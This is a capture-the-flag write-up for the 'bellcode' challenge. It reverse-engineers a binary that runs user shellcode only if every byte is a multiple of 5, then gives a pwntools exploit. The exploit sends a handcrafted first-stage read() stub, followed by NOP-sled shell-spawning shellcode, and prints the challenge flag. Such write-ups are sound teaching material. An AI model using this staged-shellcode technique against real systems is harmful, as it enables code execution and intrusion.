# Description #

Do you like Taco Bell?

# Attachments #

https://imaginaryctf.org/r/kJ0Sk#bellcode nc bellcode.chal.imaginaryctf.org 1337

# Analysis # 
We're given a binary named `bellcode`, let's run our usual analysis on this.

`file ./bellcode` 
```
bellcode: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=da59479ea84f3486e2045ab7bd8f81df1e7625a1, for GNU/Linux 3.2.0, not stripped
```

`checksec ./bellcode`
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## ghidra ##
To figure out what this binary is doing, we're going to load it in ghidra and starting at the main() function: 

```c
undefined8 main(void)

{
  byte bVar1;
  byte *local_18;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  mmap(&DAT_00fac300,0x2000,7,0x21,-1,0);
  puts("What\'s your shellcode?");
  fgets(&DAT_00fac300,0x1000,stdin);
  local_18 = &DAT_00fac300;
  while( true ) {
    if ((byte *)0xfad2ff < local_18) {
      puts("OK. Running your shellcode now!");
      (*(code *)&DAT_00fac300)();
      return 0;
    }
    bVar1 = *local_18;
    if ((byte)(bVar1 + (char)((((uint)bVar1 * 0x21 + (uint)bVar1 * 8) * 5 >> 8 & 0xff) >> 2) * -5)
        != '\0') break;
    local_18 = local_18 + 1;
  }
  puts(s_Seems_that_you_tried_to_escape._T_00102020);
                    /* WARNING: Subroutine does not return */
  exit(-1);
}

```

Let's go over this code in segments. 


The first couple of lines are some initialization, setting up two local stack variables and preparing stdin/stdout with setvbuf

```c
  byte bVar1;
  byte *local_18;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);

```

Next, we see a call to mmap that tries to map **0x2000 (8192)** bytes at address **0xfac300** and then reads **0x1000 (4096)** bytes into the buffer at **0xfac300** with fgets()

```c
  mmap(&DAT_00fac300,0x2000,7,0x21,-1,0);
  puts("What\'s your shellcode?");
  fgets(&DAT_00fac300,0x1000,stdin);
```

Then, we enter some loop that seems to iterate over the bytes starting at address **0xfac300** and ending at address **0xfad2ff+1**, which is the 0x1000 bytes of data we just wrote. 

```c
  local_18 = &DAT_00fac300;
  while( true ) {
    if ((byte *)0xfad2ff < local_18) {
      puts("OK. Running your shellcode now!");
      (*(code *)&DAT_00fac300)();
      return 0;
    }
    bVar1 = *local_18;
    if ((byte)(bVar1 + (char)((((uint)bVar1 * 0x21 + (uint)bVar1 * 8) * 5 >> 8 & 0xff) >> 2) * -5)
        != '\0') break;
    local_18 = local_18 + 1;
  }
  puts(s_Seems_that_you_tried_to_escape._T_00102020);
```

And it seems to check every byte for something with this convoluted statement: 

```c
if ((byte)(bVar1 + (char)((((uint)bVar1 * 0x21 + (uint)bVar1 * 8) * 5 >> 8 & 0xff) >> 2) * -5)
```

We can also see that once all the bytes we wrote did not trigger the above convoluted statement, we execute the buffer.

```c
    if ((byte *)0xfad2ff < local_18) {
      puts("OK. Running your shellcode now!");
      (*(code *)&DAT_00fac300)();
      return 0;
    }
```

So far, this looks like a 'shellcode challenge', meaning we can input arbitrary shellcode but we have to defeat some kind of filter or character blacklist. In this case, this will probably correspond to the convoluted byte-check. 

In stead of banging our heads against this weird statement we might be able to figure out what it actually does by doing some dynamic analysis. I decided to actually run the binary and do some very basic manual fuzzing. 

Let's start by giving it some random amount of A's

```
What's your shellcode?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
OK. Running your shellcode now!
Segmentation fault (core dumped)
```

Interesting! we see a crash and we somehow triggered the shellcode, meaning that `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` does **not** trip up the filter.

Since we are already kind of know or are assuming this to be some kind of byte-filter, lets try some other payloads: 

```
What's your shellcode?
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Seems that you tried to escape. Try harder™.

```

So clearly, since the length of these payloads were the same and only the byte values differ (0x41 for 'A' and 0x42 for 'B') we can make the assumption that A is not on the blacklist but B is. 

What about other characters? Just trying a few: 

```
What's your shellcode?
A
OK. Running your shellcode now!
Segmentation fault (core dumped)

What's your shellcode?
B
Seems that you tried to escape. Try harder™.

What's your shellcode?
C
Seems that you tried to escape. Try harder™.

What's your shellcode?
D
Seems that you tried to escape. Try harder™.

What's your shellcode?
E
Seems that you tried to escape. Try harder™.

What's your shellcode?
F
OK. Running your shellcode now!
Segmentation fault (core dumped)

What's your shellcode?
G
Seems that you tried to escape. Try harder™.

```

It seems like A worked, and then F also worked. We'll keep this in the back of our minds. 

Since we're only dealing with a byte-by-byte blacklist, there can only be 0xFF (254) total values to check, but this would be boring and hard to check manually, so let's automate it with pythonTM 

```python
#!/usr/bin/env python3
from pwn import *

found_bytes = b""
bad_bytes = b""

for i in range(0, 0xFF):
    p = process("./bellcode")
    payload = bytes([i])
    p.sendline(payload)
    response = p.recvall()
    if b"Try harder" not in response: 
        found_bytes += payload
    else:
        bad_bytes += payload

print("GOOD CHARS:")
print(found_bytes)
print("BAD CHARS:")
print(bad_bytes)
```

This produces the output: 
```
GOOD CHARS:
b'\x00\x05\n\x0f\x14\x19\x1e#(-27<AFKPUZ_dinsx}\x82\x87\x8c\x91\x96\x9b\xa0\xa5\xaa\xaf\xb4\xb9\xbe\xc3\xc8\xcd\xd2\xd7\xdc\xe1\xe6\xeb\xf0\xf5\xfa'
BAD CHARS:
b'\x01\x02\x03\x04\x06\x07\x08\t\x0b\x0c\r\x0e\x10\x11\x12\x13\x15\x16\x17\x18\x1a\x1b\x1c\x1d\x1f !"$%&\')*+,./01345689:;=>?@BCDEGHIJLMNOQRSTVWXY[\\]^`abcefghjklmopqrtuvwyz{|~\x7f\x80\x81\x83\x84\x85\x86\x88\x89\x8a\x8b\x8d\x8e\x8f\x90\x92\x93\x94\x95\x97\x98\x99\x9a\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa6\xa7\xa8\xa9\xab\xac\xad\xae\xb0\xb1\xb2\xb3\xb5\xb6\xb7\xb8\xba\xbb\xbc\xbd\xbf\xc0\xc1\xc2\xc4\xc5\xc6\xc7\xc9\xca\xcb\xcc\xce\xcf\xd0\xd1\xd3\xd4\xd5\xd6\xd8\xd9\xda\xdb\xdd\xde\xdf\xe0\xe2\xe3\xe4\xe5\xe7\xe8\xe9\xea\xec\xed\xee\xef\xf1\xf2\xf3\xf4\xf6\xf7\xf8\xf9\xfb\xfc\xfd\xfe'
```

This is quite the list of bad characters, i quickly tried some shellcode encoders but none of them were able to deal with this kind of blacklist (let me know if you find an encoder that can). Ofcourse this makes sense in the context of a CTF like this where it's expected that we hand-craft our shellcode. 

On that note: let's see what bytes **are** allowed/disallowed and see if there is any logic to it. 

Remember, we already knew that **'A' or 0x41** and **'F' or 0x46** 

Looking at the first 10 or so good chars: 
```
\x00\x05\n\x0f\x14\x19\x1e#(-27<AF
```

We see 0, 5, \n or 0x0a or 10, \x0f or 15, \x14 or 20, 
so.. 0, 5, 10, 15, 20, ...

From this pattern we can reasonably make the assumption that the bytes are checked and allowed if theyre modulo 5


# Exploitation #

The smallest first stage payload we could ideally come up with would be 
a syscall to read() from stdin to the shellcode buffer so we can bypass the initial shellcode filter and provide any shellcode we want as a second stage.

We are probably going to need this x64 instruction reference: http://ref.x86asm.net/coder64.html

The first question we need to answer is "Can we perform a syscall at all?" 

Searching through the instruction reference sheet we find: 
```
	0F	05				D15	E			SYSCALL
```

This seems like a very convenient result, both 0x0F and 0x05 are allowed!

Eventually our goal is to call `read(0, 0xfac300, N)`. To perform a syscall we need to set: 
- RAX to the syscall number, in this case read = 0
- RDI to the first argument, stdin = 0
- RSI to 0xfac300
- RDX to some value N thats larger than our second-stage payload.

Let's figure out what the values of all these registers are when our shellcode is run: 

```
i r
rax            0x0                 0x0
rdx            0xfac300            0xfac300
rsi            0x1                 0x1
rdi            0x7ffff7f9da70      0x7ffff7f9da70
```

Nice, so RAX is already set to 0 and RDX contains a large enough value so we only have to figure out how to get the value 0xfac300 in RSI and how to set RDI to 0. Note that conveniently the address of the shellcode also consists of bytes that are a multiple of 5: 0x00, 0xc3 and 0xfa

After a bit of experimenting with different instructions we find the following: 

```python
>>> asm("mov esi, 0xfac300")
b'\xbe\x00\xc3\xfa\x00'
```

The last piece of the puzzle is setting rdi to 0. It turns out a pop rdi is:

```python
asm("pop rdi")
b'_'
```

The '_' character is 0x5f. If we pop enough values off the stack we will eventually pop a 0x0000000000000000 into rdi. 

## Putting it all together ##

```python
#!/usr/bin/env python3
from pwn import * 

p = process("./bellcode")
p = remote("bellcode.chal.imaginaryctf.org", 1337)
context.update(arch="amd64")

"""
so we need to find a way to call read(0, shellcode_buf, N)
1. set rax to 0
2. set rdi to 0
3. set rsi to somewhere in the shellcode buffer 
4. syscall
"""

# rax is already 0
# null out rdi by popping a 0 off the stack into it 
# note: 6 pop rdi's work locally to set rdi to 0 but remotely we need 8
# \x5f                  = pop rdi * 6
# \xbe\x00\xc3\xfa\x00  = mov esi, 0xfac300
# \x0f\x05              = syscall

payload = b"\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\xbe\x00\xc3\xfa\x00\x0f\x05" 
pause()
p.sendline(payload)

# send second stage payload, nopsled + generic sh shellcode
payload = shellcraft.amd64.linux.sh()
p.sendline( (b"\x90" * 200) + asm(payload))

p.interactive()
```

Giving us the flag 

```
ictf{did_mod_5_ring_a_bell_be00c3fa}
```